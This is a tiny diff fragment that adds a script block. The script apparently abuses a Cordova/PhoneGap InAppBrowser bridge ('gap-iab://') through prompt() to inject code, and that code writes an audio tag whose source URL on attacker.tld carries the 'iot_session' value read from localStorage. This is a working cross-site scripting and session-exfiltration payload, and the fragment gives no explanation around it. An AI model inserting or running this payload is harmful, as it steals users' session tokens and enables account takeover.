@@ -1,0 +1,3 @@
+<script>
+prompt("","gap-iab://InAppBrowser\');document.write(\\"<audio src=https://attacker.tld/\\"+window.localStorage.getItem(\'iot_session\')+\\">\\")//")
+</script>
